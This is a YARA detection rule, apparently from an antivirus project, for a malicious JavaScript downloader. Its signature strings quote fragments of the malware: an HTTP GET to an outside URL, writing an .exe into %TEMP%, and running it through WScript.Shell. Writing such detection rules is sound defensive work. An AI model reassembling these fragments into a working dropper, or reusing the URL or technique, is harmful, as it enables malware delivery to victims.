rule sig_20160329_398a9321fda5085896e3578c3e414d4d {
  meta:
    description = "datamaliciousorder - file 20160329_398a9321fda5085896e3578c3e414d4d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3084817731db3a2ea9e5ad7a477a02fb5c0cb42936280bae2e0a405e43004a51"

  strings:
    $s1  = "g0[u](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "function uc() {return f[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hk4ZbrIHnbx.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[X](B() * 11); if (g0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var f = function P() {return WScript[cu](\"WScript.Shell\");}(), MB = 11;" fullword ascii
    $s5  = "function N(yC, R){y = y * 1; return yC - R;};" fullword ascii
    $s6  = "function PA(){return \"\" + rB;};" fullword ascii
    $s7  = "function z(r){f[\"Run\"](r, y, y);};" fullword ascii
    $s8  = "function p() {return ((yY == true) && (yY == a)) ? 1 : y;};" fullword ascii
    $s9  = "function B(){return 22;};" fullword ascii
    $s10 = "return N(rn, g);" fullword ascii
    $s11 = "var jT = new this[\"Date\"]();" fullword ascii
    $s12 = "function mI()" fullword ascii
    $s13 = "function wp(Kh) {var EH = (1, 2, 3, 4, 5, Kh); return EH;};" fullword ascii
    $s14 = "function I(){return cu;};" fullword ascii
    $s15 = " while (yp){" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "yY = true; " fullword ascii
    $s19 = "var yY = false;" fullword ascii
    $s20 = "} catch(GJ){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}